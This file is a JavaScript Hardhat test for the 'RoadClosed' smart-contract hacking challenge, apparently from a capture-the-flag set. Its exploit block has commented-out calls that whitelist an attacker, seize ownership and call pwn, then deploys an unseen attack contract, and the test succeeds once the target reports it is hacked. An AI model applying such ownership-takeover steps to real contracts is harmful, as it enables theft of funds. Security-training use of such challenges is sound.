const {time, loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("RoadClosed", function () {

  let deployer, attacker;

  before(async function (){
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const RoadClosedFactory = await ethers.getContractFactory("RoadClosed");
    this.RoadClosed = await RoadClosedFactory.deploy();
    expect(await this.RoadClosed.isHacked()).to.be.equal(false);
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    
    // await this.RoadClosed.connect(attacker).addToWhitelist(attacker.address);    
    // await this.RoadClosed.connect(attacker).changeOwner(attacker.address);
    // expect(await this.RoadClosed.connect(attacker).isOwner()).to.be.equal(true); 
    // await this.RoadClosed.connect(attacker).pwn(attacker.address);

    const AttackRoadClosedFactory = await ethers.getContractFactory("AttackRoadClosed");
    AttackRoadClosed = await AttackRoadClosedFactory.deploy(this.RoadClosed.address);

  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // hacked = true
    expect(await this.RoadClosed.isHacked()).to.be.equal(true);        
  });

});
